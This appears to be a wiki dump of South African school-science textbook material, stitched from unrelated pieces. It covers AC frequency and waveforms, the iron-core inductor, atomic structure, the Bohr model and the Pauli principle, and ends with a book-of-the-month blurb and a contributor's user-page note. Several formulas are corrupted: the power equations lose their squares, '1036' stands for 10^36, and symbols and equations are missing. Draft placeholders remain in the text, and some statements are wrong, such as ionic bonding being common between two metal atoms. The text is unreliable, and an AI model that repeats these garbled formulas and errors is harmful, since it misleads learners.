represents the number of wave cycles completed during one second of time. In the United States of America, the standard power-line
frequency is 60 Hz, meaning that the AC voltage oscillates at a rate of 60 complete back-and-forth cycles every second. In Europe, where
the power system frequency is 50 Hz, the AC voltage only completes 50 cycles every second. A radio station transmitter broadcasting at a
frequency of 100 MHz generates an AC voltage oscillating at a rate of 100 ''million'' cycles every second.

Period and frequency are mathematical reciprocals of one another. That is to say, if a wave has a period of 10 seconds, its frequency
will be 0.1 Hz, or 1/10 of a cycle per second: 

&lt;math&gt;\ Frequency\ in\ hertz = \frac{1}{Period\ in\ seconds}&lt;/math&gt;

An instrument called an ''oscilloscope'' is used to display a changing voltage over time on a graphical screen. You may be familiar
with the appearance of an ''ECG'' or ''EKG'' (electrocardiograph) machine, used by physicians to graph the
oscillations of a patient's heart over time. The ECG is a special-purpose oscilloscope expressly designed for medical use.
General-purpose oscilloscopes have the ability to display voltage from virtually any voltage source, plotted as a graph with time as the
independent variable. The relationship between period and frequency is very useful to know when displaying an AC voltage or current
waveform on an oscilloscope screen. By measuring the period of the wave (in seconds) on the horizontal axis of the oscilloscope screen and
reciprocating that time value, you can determine the frequency in hertz.

[[Image:Fhsst_electromag19.png|Fhsst_electromag19.png]]

Voltage and current are by no means the only physical variables subject to variation over time. Much more common to our everyday
experience is ''sound'', which is nothing more than the alternating compression and decompression (pressure waves) of air
molecules, interpreted by our ears as a physical sensation. Because alternating current is a wave phenomenon, it shares many of the
properties of other wave phenomena, like sound. For this reason, sound (especially structured music) provides an excellent analogy for
relating AC concepts.

In musical terms, frequency is equivalent to ''pitch''. Low-pitch notes such as those produced by a tuba or bassoon consist of
air molecule vibrations that are relatively slow (low frequency). High-pitch notes such as those produced by a flute or whistle consist
of the same type of vibrations in the air, only vibrating at a much faster rate (higher frequency). Here is a table showing the actual
frequencies for a range of common musical notes:

[[Image:Fhsst_electromag20.png|Fhsst_electromag20.png]]

Astute observers will notice that all notes on the table bearing the same letter designation are related by a frequency ratio of 2:1. For
example, the first frequency shown (designated with the letter &quot;A&quot;) is 220 Hz. The next highest &quot;A&quot; note has a frequency of 440 Hz -
exactly twice as many sound wave cycles per second. The same 2:1 ratio holds true for the first A sharp (233.08 Hz) and the next A
sharp (466.16 Hz), and for all note pairs found in the table.

Audibly, two notes whose frequencies are exactly double each other sound remarkably similar. This similarity in sound is musically
recognized, the shortest span on a musical scale separating such note pairs being called an ''octave''. Following this rule, the next
highest &quot;A&quot; note (one octave above 440 Hz) will be 880 Hz, the next lowest &quot;A&quot; (one octave below 220 Hz) will be 110 Hz. A view of a
piano keyboard helps to put this scale into perspective:

[[Image:Fhsst_electromag21.png|Fhsst_electromag21.png]]

As you can see, one octave is equal to ''eight'' white keys' worth of distance on a piano keyboard. The familiar musical mnemonic
(doe-ray-mee-fah-so-lah-tee-doe) - yes, the same pattern immortalized in the whimsical Rodgers and Hammerstein song sung in ''The
Sound of Music'' - covers one octave from C to C.

While electromechanical alternators and many other physical phenomena naturally produce sine waves, this is not the only kind of alternating
wave in existence. Other &quot;waveforms&quot; of AC are commonly produced within electronic circuitry. Here are but a few sample waveforms and
their common designations:

[[Image:Fhsst_electromag22.png|Fhsst_electromag22.png]]

These waveforms are by no means the only kinds of waveforms in existence. They're simply a few that are common enough to have been
given distinct names. Even in circuits that are supposed to manifest &quot;pure&quot; sine, square, triangle, or sawtooth voltage/current waveforms,
the real-life result is often a distorted version of the intended waveshape. Some waveforms are so complex that they defy
classification as a particular &quot;type&quot; (including waveforms associated with many kinds of musical instruments). Generally speaking, any
waveshape bearing close resemblance to a perfect sine wave is termed ''sinusoidal'', anything different being labeled as
''non-sinusoidal''. Being that the waveform of an AC voltage or current is crucial to its impact in a circuit, we need to be aware of
the fact that AC waves come in a variety of shapes.</text>

= Measurements of AC magnitude =

So far we know that AC voltage alternates in polarity and AC current alternates in direction. We also know that AC can alternate in a
variety of different ways, and by tracing the alternation over time we can plot it as a &quot;waveform.&quot; We can measure the rate of alternation
by measuring the time it takes for a wave to evolve before it repeats itself (the &quot;period&quot;), and express this as cycles per unit time, or
&quot;frequency.&quot; In music, frequency is the same as ''pitch'', which is the essential property distinguishing one note from another.

However, we encounter a measurement problem if we try to express how large or small an AC quantity is. With DC, where quantities of
voltage and current are generally stable, we have little trouble expressing how much voltage or current we have in any part of a
circuit. But how do you grant a single measurement of magnitude to something that is constantly changing?

One way to express the intensity, or magnitude (also called the ''amplitude''), of an AC quantity is to measure its peak height
on a waveform graph. This is known as the ''peak'' or ''crest'' value of an AC waveform:

[[Image:Fhsst_electromag23.png|Fhsst_electromag23.png]]

Another way is to measure the total height between opposite peaks. This is known as the ''peak-to-peak'' (P-P) value of an AC
waveform:

[[Image:Fhsst_electromag24.png|Fhsst_electromag24.png]]

Unfortunately, either one of these expressions of waveform amplitude can be misleading when comparing two different types of waves. For
example, a square wave peaking at 10 volts is obviously a greater amount of voltage for a greater amount of time than a triangle wave
peaking at 10 volts. The effects of these two AC voltages powering a load would be quite different:

[[Image:Fhsst_electromag25.png|Fhsst_electromag25.png]]

One way of expressing the amplitude of different waveshapes in a more equivalent fashion is to mathematically average the values of all the
points on a waveform's graph to a single, aggregate number. This amplitude measure is known simply as the ''average'' value of the
waveform. If we average all the points on the waveform algebraically (that is, to consider their ''sign'', either positive or
negative), the average value for most waveforms is technically zero, because all the positive points cancel out all the negative points
over a full cycle:

[[Image:Fhsst_electromag26.png|Fhsst_electromag26.png]]

This, of course, will be true for any waveform having equal-area portions above and below the &quot;zero&quot; line of a plot. However, as a
''practical'' measure of a waveform's aggregate value, &quot;average&quot; is usually defined as the mathematical mean of all the points'
''absolute values'' over a cycle. In other words, we calculate the practical average value of the waveform by considering all points
on the wave as positive quantities, as if the waveform looked like this:

[[Image:Fhsst_electromag27.png|Fhsst_electromag27.png]]

Polarity-insensitive mechanical meter movements (meters designed to respond equally to the positive and negative half-cycles of an
alternating voltage or current) register in proportion to the waveform's (practical) average value, because the inertia of the
pointer against the tension of the spring naturally averages the force produced by the varying voltage/current values over time. Conversely,
polarity-sensitive meter movements vibrate uselessly if exposed to AC voltage or current, their needles oscillating rapidly about the zero
mark, indicating the true (algebraic) average value of zero for a symmetrical waveform. When the &quot;average&quot; value of a waveform is
referenced in this text, it will be assumed that the &quot;practical&quot; definition of average is intended unless otherwise specified.

Another method of deriving an aggregate value for waveform amplitude is based on the waveform's ability to do useful work when applied to a
load resistance. Unfortunately, an AC measurement based on work performed by a waveform is not the same as that waveform's &quot;average&quot;
value, because the ''power'' dissipated by a given load (work performed per unit time) is not directly proportional to the magnitude
of either the voltage or current impressed upon it. Rather, power is proportional to the ''square'' of the voltage or current applied
to a resistance (P = E/R, and P = IR). Although the mathematics of such an amplitude measurement might not be straightforward, the utility of it is.

Consider a bandsaw and a jigsaw, two pieces of modern woodworking equipment. Both types of saws cut with a thin, toothed, motor-powered
metal blade to cut wood. But while the bandsaw uses a continuous motion of the blade to cut, the jigsaw uses a back-and-forth motion.
The comparison of alternating current (AC) to direct current (DC) may be likened to the comparison of these two saw types:

[[Image:Fhsst_electromag28.png|Fhsst_electromag28.png]]

The problem of trying to describe the changing quantities of AC voltage or current in a single, aggregate measurement is also present
in this saw analogy: how might we express the speed of a jigsaw blade? A bandsaw blade moves with a constant speed, similar to the way DC
voltage pushes or DC current moves with a constant magnitude. A jigsaw blade, on the other hand, moves back and forth, its blade speed
constantly changing. What is more, the back-and-forth motion of any two jigsaws may not be of the same type, depending on the mechanical
design of the saws. One jigsaw might move its blade with a sine-wave motion, while another with a triangle-wave motion. To rate a jigsaw
based on its ''peak'' blade speed would be quite misleading when comparing one jigsaw to another (or a jigsaw with a bandsaw!).
Despite the fact that these different saws move their blades in different manners, they are equal in one respect: they all cut wood,
and a quantitative comparison of this common function can serve as a common basis for which to rate blade speed.

Picture a jigsaw and bandsaw side-by-side, equipped with identical blades (same tooth pitch, angle, etc.), equally capable of cutting the
same thickness of the same type of wood at the same rate. We might say that the two saws were equivalent or equal in their cutting
capacity. Might this comparison be used to assign a &quot;bandsaw equivalent&quot; blade speed to the jigsaw's back-and-forth blade motion 
to relate the wood-cutting effectiveness of one to the other? This is the general idea used to assign a &quot;DC equivalent&quot; measurement to any
AC voltage or current: whatever magnitude of DC voltage or current would produce the same amount of heat energy dissipation through an
equal resistance:

[[Image:Fhsst_electromag29.png|Fhsst_electromag29.png]]

Suppose we were to wrap a coil of insulated wire around a loop of ferromagnetic material and energize this coil with an AC voltage
source:

[[Image:Fhsst_electromag30.png|Fhsst_electromag30.png]]

As an inductor, we would expect this iron-core coil to oppose the applied voltage with its inductive reactance, limiting current through
the coil as predicted by the equations &lt;math&gt;X_L= 2\pi\ fL&lt;/math&gt; and &lt;math&gt;I=E/X&lt;/math&gt; (or &lt;math&gt;I=E/Z&lt;/math&gt;). For the purposes of this example, though, we need to take
a more detailed look at the interactions of voltage, current, and magnetic flux in the device.

Kirchhoff's voltage law describes how the algebraic sum of all voltages in a loop must equal zero. In this example, we could apply
this fundamental law of electricity to describe the respective voltages of the source and of the inductor coil. Here, as in any
one-source, one-load circuit, the voltage dropped across the load must equal the voltage supplied by the source, assuming zero voltage
dropped along the resistance of any connecting wires. In other words, the load (inductor coil) must produce an opposing voltage equal in
magnitude to the source, in order that it may balance against the source voltage and produce an algebraic loop voltage sum of zero.
From where does this opposing voltage arise? If the load were a resistor, the opposing voltage would originate from the &quot;friction&quot; of
electrons flowing through the resistance of the resistor. With a perfect inductor (no resistance in the coil wire), the opposing
voltage comes from another mechanism: the ''reaction'' to a changing magnetic flux in the iron core.

Michael Faraday discovered the mathematical relationship between magnetic flux (&lt;math&gt;\Phi&lt;/math&gt;)and induced voltage with this equation: 

{| 
|- 
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | &lt;math&gt;E=N\frac{d\Phi}{dt}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | ''where'':
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | ''e'' = (Instantaneous) induced voltage in volts
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | ''N'' = Number of turns in wire coil (straight wire = 1)
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | &lt;math&gt;\Phi&lt;/math&gt; = Magnetic flux in webers
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | ''t'' = Time in seconds
|}

The instantaneous voltage (voltage dropped at any instant in time) across a wire coil is equal to the number of turns of that coil around
the core (N) multiplied by the instantaneous rate-of-change in magnetic flux (d\Phi /dt) linking with the coil. Graphed, this shows 
itself as a set of sine waves (assuming a sinusoidal voltage source), the flux wave &lt;math&gt;90^\circ&lt;/math&gt; lagging behind the voltage wave: 

[[Image:Fhsst_electromag31.png|Fhsst_electromag31.png]]

Magnetic flux through a ferromagnetic material is analogous to current through a conductor: it must be motivated by some force in order to
occur. In electric circuits, this motivating force is voltage (a.k.a. electromotive force, or EMF). In magnetic &quot;circuits,&quot; this
motivating force is ''magnetomotive force'', or ''mmf''. Magnetomotive force (mmf) and magnetic flux (&lt;math&gt;\Phi&lt;/math&gt;) are related to 
each other by a property of magnetic materials known as ''reluctance'' (the latter quantity symbolized by a strange-looking letter &quot;R&quot; (&lt;math&gt;\Re&lt;/math&gt;)):

{| 
|A comparison of &quot;Ohm's Law&quot; for electric and magnetic circuits:
|- 
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | &lt;math&gt;E=I\ R&lt;/math&gt;
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | &lt;math&gt;mmf=\Phi \Re&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;LEFT&quot; | '''Electrical'''
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | '''Magnetic'''
|}


In our example, the mmf required to produce this changing magnetic flux (&lt;math&gt;\Phi&lt;/math&gt;) must be supplied by a changing current through the coil. 
Magnetomotive force generated by an electromagnet coil is equal to the amount of current through that coil (in amps) multiplied by the number
of turns of that coil around the core (the SI unit for mmf is the ''amp-turn''). Because the mathematical relationship between
magnetic flux and mmf is directly proportional, and because the mathematical relationship between mmf and current is also directly
proportional (no rates-of-change present in either equation), the current through the coil will be in-phase with the flux wave:

[[Image:Fhsst_electromag32.png|Fhsst_electromag32.png]]

This is why alternating current through an inductor lags the applied voltage waveform by &lt;math&gt;90^\circ&lt;/math&gt;: because that is what is required to 
produce a changing magnetic flux whose rate-of-change produces an opposing voltage in-phase with the applied voltage. Due to its
function in providing magnetizing force (mmf) for the core, this current is sometimes referred to as the ''magnetizing current''.

It should be mentioned that the current through an iron-core inductor is not perfectly sinusoidal (sine-wave shaped), due to the nonlinear
B/H magnetization curve of iron. In fact, if the inductor is cheaply built, using as little iron as possible, the magnetic flux density
might reach high levels (approaching saturation), resulting in a magnetizing current waveform that looks something like this:

[[Image:Fhsst_electromag33.png|Fhsst_electromag33.png]]

When a ferromagnetic material approaches magnetic flux saturation, disproportionately greater levels of magnetic field force (mmf) are
required to deliver equal increases in magnetic field flux (&lt;math&gt;\Phi&lt;/math&gt;). Because mmf is proportional to current through the magnetizing coil
(mmf = NI, where &quot;N&quot; is the number of turns of wire in the coil and &quot;I&quot; is the current through it), the large increases of mmf required to
supply the needed increases in flux results in large increases in coil current. Thus, coil current increases dramatically at the peaks in
order to maintain a flux waveform that isn't distorted, accounting for the bell-shaped half-cycles of the current waveform in the above plot.

The situation is further complicated by energy losses within the iron core. The effects of hysteresis and eddy currents conspire to further
distort and complicate the current waveform, making it even less sinusoidal and altering its phase to be lagging slightly less than
&lt;math&gt;90^\circ&lt;/math&gt; behind the applied voltage waveform. This coil current resulting from the sum total of all magnetic effects in the core
(d&lt;math&gt;\Phi&lt;/math&gt;/dt magnetization plus hysteresis losses, eddy current losses, etc.) is called the ''exciting current''. The distortion of an
iron-core inductor's exciting current may be minimized if it is designed for and operated at very low flux densities. Generally
speaking, this requires a core with large cross-sectional area, which tends to make the inductor bulky and expensive. For the sake of
simplicity, though, we'll assume that our example core is far from saturation and free from all losses, resulting in a perfectly
sinusoidal exciting current.

As we've seen already in the inductors chapter, having a current waveform &lt;math&gt;90^\circ&lt;/math&gt; out of phase with the voltage waveform creates a 
condition where power is alternately absorbed and returned to the circuit by the inductor. If the inductor is perfect (no wire
resistance, no magnetic core losses, etc.), it will dissipate zero power.

Let us now consider the same inductor device, except this time with a second coil wrapped around the same iron core. The first coil will be
labeled the ''primary'' coil, while the second will be labeled the ''secondary'':

[[Image:Fhsst_electromag34.png|Fhsst_electromag34.png]]

If this secondary coil experiences the same magnetic flux change as the primary (which it should, assuming perfect containment of the
magnetic flux through the common core), and has the same number of turns around the core, a voltage of equal magnitude and phase to the
applied voltage will be induced along its length. In the following graph, the induced voltage waveform is drawn slightly smaller than the
source voltage waveform simply to distinguish one from the other:

=The Atom =

Atoms are the building blocks of matter. They are the basis of all the structures and organisms in the universe. The
planets, the sun, grass and trees, the air we breathe, and people are all made up of atoms.

There are approximately 100 different types of atom, although many of these exist in very small quantities. Every chemical element is one type of atom, such as hydrogen (H), aluminium (Al) and iron (Fe).</text>

= Structure of the Atom =

Atoms are very small and cannot be seen with the naked eye nor can they be seen in microscopes using the eye.  One million atoms fit across the width of a strand of hair.

They consist of two main parts: the positively charged '''nucleus''' at the centre and the negatively charged elementary particles called '''electrons''' which surround the nucleus in their '''orbitals'''. (''Elementary'' particle means that the electron cannot be broken down to anything smaller and can be
thought of as a point particle.) The nucleus of an atom is made up of a collection of positively charged '''protons''' and neutral particles called '''neutrons'''.

Interesting fact: the neutrons and protons are ''not'' elementary particles. They are actually made up of even smaller particles called quarks. Both protons and neutrons are made of three quarks each. There are all sorts of other particles composed of quarks which nuclear physicists study using huge detectors - you can find out more about this by reading the essay in Chapter ??

&lt;br/&gt;
'''NOTE''' :Insert diagram of atomic structure - see lab posters

Atoms are electrically neutral which means that they have the same number of negative electrons as positive protons. The number of
protons in an atom is called the '''atomic number''' which is sometimes also called '''Z'''. 

&lt;br/&gt;
'''NOTE''' :check A and Z 

The atomic number is what distinguishes the different chemical elements in the Periodic table from each other. In fact, the elements are
listed on the Periodic table in order of their atomic numbers. For example, the first element, hydrogen (H), has one proton whereas
the sixth element, carbon (C) has 6 protons. Atoms with the same number of protons (atomic number) share physical properties and
show similar chemical behaviour. The number of neutrons ''plus'' protons in the nucleus is called the '''atomic
mass''' of the atom.</text>

= Isotopes =

Two atoms are considered to be the same element if they have the same number of protons (atomic number). However, they do not have
to have the same number of neutrons or overall atomic mass. Atoms which have the same number of protons but different numbers of
neutrons are called '''isotopes'''. For example, the hydrogen atom has one proton and no neutrons. Therefore its atomic number
is Z=1 and atomic mass is A=1. If a neutron is added to the hydrogen nucleus, then a new atom is formed with atomic mass A=2
but atomic number is still Z=1. This atom is called deuterium and is an isotope of hydrogen.</text>

= Energy quantization and electron configuration =

The electrons which inhabit the space surrounding the nucleus are not able to have arbitrary energies.  In fact they are restricted to a discrete set of energies while they are trapped in an atom.  This discretization of energy values is known as &quot;quantization&quot;, meaning that the allowed energies are separated by discrete energy differences, known as &quot;quanta&quot;.

This startling behavior arises from the wavelike nature of electrons and the Schröedinger equation which governs them, both topics which should be addressed in a quantum physics course.  Suffice it to say that when particles are in free space (meaning there are no potentials present), the allowed energy values are continuous.  However, when they are within a potential, for instance in the potential generated by protons in the nucleus of an atom, their energy values become quantized.

The effects of this quantization are profound.  Essentially all of the other natural sciences - chemistry, biology, and other derived sciences rely primarily on the atomic behavior resulting from this quantization.

These energy levels are associated with distances from the nucleus (quantum physics introduces a caveat here).  That is, the higher the energy of an electron, the further it is from the nucleus.  For some time between Rutherford's discovery of the nucleus-electron system within the atom and the development of quantum physics, electrons were pictured around the nucleus as planets in a solar system.  In fact, an impressive body of correct predictions can be made using this classical orbit model, but eventually quantum mechanics must take over to provide the &quot;complete&quot; picture.  It turns out that electrons exist as &quot;wavefunctions&quot;.  They can only be described by a field of probabilities for finding them at some location.  These 3-D probability functions can be for visual purposes encapsulated by surfaces:

&lt;&lt;A nifty picture of 3-D electron orbitals would be great...anyone?  anyone?&gt;&gt;


When researchers were first beginning to understand the electrical structure of the atom, the primary tool was the spectrometer.</text>

= Successive ionization energies to provide evidence for arrangement of electrons into core and valence =

[Brink and Jones sections: de Broglie - matter shows particle and wave characteristics, proved by Davisson and Germer. Shroedinger
and Heisenberg developed this model into quantum mechanics] 

The nucleus (atomic nucleus) is the center of an atom. It is composed of one or more protons and usually some neutrons as well.
The number of protons in an atom's nucleus is called the atomic number, and determines which element the atom is (for example
hydrogen, carbon, oxygen, etc.).

Though the positively charged protons exert a repulsive electromagnetic force on each other, the distances between nuclear
particles are small enough that the strong interaction (which is stronger than the electromagnetic force but decreases more rapidly
with distance) predominates. (The gravitational attraction is negligible, being a factor 1036 weaker than this electromagnetic
repulsion.)

The discovery of the electron was the first indication that the atom had internal structure. This structure was initially imagined
according to the &quot;raisin cookie&quot; or &quot;plum pudding&quot; model, in which the small, negatively charged electrons were embedded in a large
sphere containing all the positive charge. Ernest Rutherford and Marsden, however, discovered in 1911 that alpha particles from a
radium source were sometimes scattered backwards from a gold foil, indicating that there must be a dense concentration of positive charge at the center of the atom.  This discovery led to the acceptance of a planetary model, 
in which the electrons orbited a tiny nucleus in the same way that the planets orbit the sun.

Interesting Fact: The word atom is derived from the Greek atomos, indivisible, from a-, not, and tomos, a cut.

An atom is the smallest portion into which a chemical element can be divided while still retaining its properties. Atoms are the
basic constituents of molecules and ordinary matter. Atoms are composed of subatomic particles.

Atoms are composed mostly of empty space, but also of smaller subatomic particles. At the center of the atom is a tiny positive
nucleus composed of nucleons (protons and neutrons). The rest of the atom contains only the fairly flexible electron shells.
Usually atoms are electrically neutral with as many electrons as protons.

Atoms are generally classified by their atomic number, which corresponds to the number of protons in the atom. For example,
carbon atoms are those atoms containing 6 protons. All atoms with the same atomic number share a wide variety of physical properties
and exhibit the same chemical behavior. The various kinds of atoms are listed in the Periodic table. Atoms having the same atomic
number, but different atomic masses (due to their different numbers of neutrons), are called isotopes.

The simplest atom is the hydrogen atom, having atomic number 1 and consisting of one proton and one electron. It has been the subject
of much interest in science, particularly in the early development of quantum theory.

The chemical behavior of atoms is largely due to interactions between the electrons. In particular the electrons in the
outermost shell, called the valence electrons, have the greatest influence on chemical behavior. Core electrons (those not in the
outer shell) play a role, but it is usually in terms of a secondary effect due to screening of the positive charge in the
atomic nucleus.

There is a strong tendency for atoms to completely fill (or empty) the outer electron shell, which in hydrogen and helium has space
for two electrons, and in all other atoms has space for eight. This is achieved either by sharing electrons with neighboring
atoms or by completely removing electrons from other atoms. When electrons are shared a covalent bond is formed between the two
atoms. Covalent bonds are the strongest type of atomic bond. 

When one or more electrons are completely removed from one atom by another, ions are formed. Ions are atoms that possess a net charge 
due to an imbalance in the number of protons and electrons. The ion that stole the electron(s) is called an anion and is
negatively charged. The atom that lost the electron(s) is called a cation and is positively charged. Cations and anions are attracted
to each other due to coulombic forces between the positive and negative charges. This attraction is called ionic bonding and is
weaker than covalent bonding.

As mentioned above covalent bonding implies a state in which electrons are shared equally between atoms, while ionic bonding
implies that the electrons are completely confined to the anion. Except for a limited number of extreme cases, neither of these
pictures is completely accurate. In most cases of covalent bonding, the electron is unequally shared, spending more time
around the more electronegative atom, resulting in the covalent bond having some ionic character. Similarly, in ionic bonding the
electrons often spend a small fraction of time around the more electropositive atom, resulting in some covalent character for the
ionic bond. 

Models of the atom

* Democritus' shaped-atom model (for want of a better name)
* The plum pudding model
* Cubical atom
* The Bohr model
* The quantum mechanical model

The Plum pudding model of the atom was made after the discovery of the electron but before the discovery of the proton or neutron. In
it, the atom is envisioned as electrons surrounded by a soup of positive charge, like plums surrounded by pudding. This model was
disproved by an experiment by Ernest Rutherford when he discovered the nucleus of the atom.

The Bohr Model is a physical model that depicts the atom as a small positively charged nucleus with electrons in orbit at
different levels, similar in structure to the solar system. Because of its simplicity, the Bohr model is still commonly used
and taught today.

In the early part of the 20th century, experiments by Ernest Rutherford and others had established that atoms consisted of a
small dense positively charged nucleus surrounded by orbiting negatively charged electrons.  However, theoretical predictions and experimental evidence quickly began to cast doubt on the classical orbital model. 

The simplest possible atom is hydrogen, which consists of a positively charged proton and a negatively charged orbiting electron.  According to the orbital model of the atom, since the nucleus (the proton) and the electron are oppositely charged they will attract one another by coulomb force, in the same way that the Sun
attracts the Earth with the gravitational force.  However, if the electron orbits the nucleus in a classical orbit, it is undergoing a central acceleration, and ought to emit
electromagnetic radiation (light) according to well established theories of electromagnetism.  If the orbiting electron radiates as it orbits, it must lose energy and therefore spiral into the nucleus in a very short time, which clearly does not occur.  

Also, it was well known at the time that atoms emit light only at certain frequencies - the frequencies at which an atom can radiate are known as the spectra of the atom.  It was clear that the emission of light by atoms was due to electrons radiating.  However, if the electrons are simply orbiting the nucleus classically like planets, there is no reason for the spectra - one would expect the electrons to emit radiation in a continuous frequency spectrum.  It soon became clear that something was very wrong with the orbital description of the atom.  

These difficulties were resolved in 1913 by Niels Bohr who proposed that:

* (1) The orbiting electrons existed in orbits that had discrete quantized energies. That is, not every orbit is possible but only certain specific ones. The exact energies of the allowed orbits depends on the atom in question.
* (2) The laws of classical mechanics do not apply when electrons make the jump from one allowed orbit to another.
* (3) When an electron makes a jump from one orbit to another the energy difference is carried off (or supplied) by a single quantum of light (called a photon) which has a frequency that directly depends on the energy difference between the two orbitals.

&lt;math&gt;f = E / h &lt;/math&gt;

where f is the frequency of the photon, E the energy difference, and h is a constant of proportionality known as Planck's constant. Defining we can write

where ?? is the angular frequency of the photon.

* (4) The allowed orbits depend on quantized (discrete) values of orbital angular momentum, L according to the equation

Where n = 1,2,3, and is called the angular momentum quantum number.

These assumptions explained many of the observations seen at the time, such as why spectra consist of discrete lines. Assumption 4)
states that the lowest value of n is 1. This corresponds to a smallest possible radius (for the mathematics see
Ohanian-principles of physics or any of the large, usually American, college introductory physics textbooks) of 0.0529 nm.
This is known as the Bohr radius, and explains why atoms are stable. Once an electron is in the lowest orbit, it can go no
further. It cannot emit any more light because it would need to go into a lower orbit, but it can't do that if it is already in the
lowest allowed orbit. 

The Bohr model is sometimes known as the semiclassical model because although it does include some ideas of quantum mechanics
it is not a full quantum mechanical description of the atom. Assumption 2) states that the laws of classical mechanics don't
apply during a quantum jump but doesn't state what laws should replace classical mechanics. Assumption 4) states that angular
momentum is quantised but does not explain why.

In order to fully describe an atom we need to use the full theory of quantum mechanics, which was worked out by a number of people
in the years following the Bohr model. This theory treats the electrons as waves, which create 3D standing wave patterns in the
atom. (This is why quantum mechanics is sometimes called wave mechanics.) This theory considers that idea of electrons as being
little billiard ball like particles that travel round in orbits as absurdly wrong  instead electrons form probability clouds. You
might find the electron here with a certain probability; you might find it over there with a different probability. However it is
interesting to note that if you work out the average radius of an electron in the lowest possible energy state it turns out to be
exactly equal to the Bohr radius (although it takes many more pages of mathematics to work it out).

The full quantum mechanics theory is a beautiful theory that has been experimentally tested and found to be incredibly accurate,
however it is mathematically much more advanced, and often using the much simpler Bohr model will get you the results with much
less hassle. The thing to remember is that it is only a model, an aid to understanding. Atoms are not really little solar systems.

= Heisenberg Uncertainty Principle =

Quantum mechanics is a physical theory that describes the behavior of physical systems at short distances. Quantum mechanics provides
a mathematical framework derived from a small set of basic principles capable of producing experimental predictions for three
types of phenomena that classical mechanics and classical electrodynamics cannot account for: quantization, wave-particle
duality, and quantum entanglement. The related terms quantum physics and quantum theory are sometimes used as synonyms of
quantum mechanics, but also to denote a superset of theories, including pre-quantum mechanics old quantum theory, or, when the
term quantum mechanics is used in a more restricted sense, to include theories like quantum field theory.

Quantum mechanics is the underlying theory of many fields of physics and chemistry, including condensed matter physics, quantum
chemistry, and particle physics.</text>

= Pauli exclusion principle =

The Pauli exclusion principle is a quantum mechanical principle which states that no two identical fermions may occupy the same
quantum state. Formulated by Wolfgang Pauli in 1925, it is also referred to as the &quot;exclusion principle&quot; or &quot;Pauli principle.&quot;

The Pauli principle only applies to fermions, particles which form antisymmetric quantum states and have half-integer spin. Fermions
include protons, neutrons, and electrons, the three types of elementary particles which constitute ordinary matter. The Pauli
exclusion principle governs many of the distinctive characteristics of matter. Particles like the photon and graviton
do not obey the Pauli exclusion principle, because they are bosons (i.e. they form symmetric quantum states and have integer spin)
rather than fermions.

The Pauli exclusion principle plays a role in a huge number of physical phenomena. One of the most important, and the one for
which it was originally formulated, is the electron shell structure of atoms. An electrically neutral atom contains bound
electrons equal in number to the protons in the nucleus. Since electrons are fermions, the Pauli exclusion principle forbids them
from occupying the same quantum state.
 
For example, consider a neutral helium atom, which has two bound electrons. Both of these electrons can occupy the lowest-energy
(1s) states by acquiring opposite spin. This does not violate the Pauli principle because spin is part of the quantum state of the
electron, so the two electrons are occupying different quantum states. However, the spin can take only two different values (or
eigenvalues.) In a lithium atom, which contains three bound electrons, the third electron cannot fit into a 1s state, and has
to occupy one of the higher-energy 2s states instead. Similarly, successive elements produce successively higher-energy shells. The
chemical properties of an element largely depends on the number of electrons in the outermost shell, which gives rise to the periodic
table of the elements.

The Pauli principle is also responsible for the large-scale stability of matter. Molecules cannot be pushed arbitrarily close
together, because the bound electrons in each molecule are forbidden from entering the same state as the electrons in the
other molecules - this is the reason for the repulsive r-12 term in the Lennard-Jones potential. The Pauli principle is the reason
you do not fall through the floor.

Astronomy provides the most spectacular demonstrations of this effect, in the form of white dwarf stars and neutron stars. In
both types of objects, the usual atomic structures are disrupted by large gravitational forces, leaving the constituents supported
only by a &quot;degeneracy pressure&quot; produced by the Pauli exclusion principle. This exotic form of matter is known as degenerate
matter. In white dwarfs, the atoms are held apart by the degeneracy pressure of the electrons. In neutron stars, which
exhibit even larger gravitational forces, the electrons have merged with the protons to form neutrons, which produce a larger
degeneracy pressure.

Another physical phenomenon for which the Pauli principle is responsible is ferromagnetic, in which the exclusion effect
implies an exchange energy that induces neighboring electron spins to align (whereas classically they would anti-align).</text>

==Capacity for bonding==

Covalent bonding is a form of chemical bonding characterized by the sharing of one or more pairs of electrons, by two atoms. In
order to produce a mutual attraction  atoms tend to share electrons, so as to fill their outer electron shells. Such bonds
are always stronger than the intermolecular hydrogen bond and similar in strength or stronger than the ionic bond. Commonly
covalent bond implies the sharing of just a single pair of electrons. The sharing of two pairs is called a double bond and
three pairs is called a triple bond. Aromatic rings of atoms and other resonant structures are held together by covalent bonds that
are intermediate between single and double. The triple bond is relatively rare in nature, and two atoms are not observed to bond
more than triply.

Covalent bonding most frequently occurs between atoms with similar electronegativities, where neither atom can provide sufficient
energy to completely remove an electron from the other atom. Covalent bonds are more common between non-metals, whereas ionic
bonding is more common between two metal atoms or a metal and a non-metal atom.

Covalent bonding tends to be stronger than other types of bonding, such as ionic bonding. In addition unlike ionic bonding, where
ions are held together by a non-directional coulombic attraction, covalent bonds are highly directional. As a result, covalently
bonded molecules tend to form in a relatively small number of characteristic shapes, exhibiting specific bonding angles.</text>

The book of the month for '''May''' is '''[[How To Build A Computer]]'''.

'''[[How To Build A Computer]]''' teaches you how to build your own computer, starting from choosing the right parts, assembling them, and choosing and installing the right software. You can learn more about computer hardware by building a computer than you can by reading every computer hardware textbook ever written. Aside from that, you get a totally personalized computer that no OEM (Original Equipment Manufacturer) could match, and the opportunity to save a lot of money in the process.

My name is Riaan, I live in [http://en.wikipedia.org/wiki/Cape_Town Cape Town], [http://en.wikipedia.org/wiki/South_Africa South Africa]. I have been asked to Wikify material that has been developed around the South African School Curriculum.

I am not the author of the material, see the specific pages for details about the different authors.

The material I have wikified can be found [[South_African_Curriculum| here]].

__TOC__

